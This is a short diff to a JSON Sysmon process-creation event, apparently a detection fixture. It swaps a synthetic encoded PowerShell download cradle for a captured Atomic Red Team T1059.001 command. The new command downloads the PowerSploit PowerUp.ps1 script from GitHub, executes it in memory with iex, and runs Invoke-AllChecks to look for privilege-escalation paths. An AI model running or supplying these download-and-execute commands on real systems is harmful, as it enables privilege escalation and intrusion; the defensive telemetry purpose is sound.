@@ -1,8 +1,10 @@
 {
   "EventID": 1,
+  "UtcTime": "2026-11-15 12:15:17.845",
   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-  "CommandLine": "\"powershell.exe\" -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
-  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-  "User": "VICTIM-PC\\analyst",
-  "_provenance": "synthetic"
+  "CommandLine": "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks}",
+  "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "User": "WIN10-LAB\\analyst",
+  "_provenance": "real-capture",
+  "_atomic_source": "Atomic Red Team T1059.001 (captured via Sysmon)"
 }
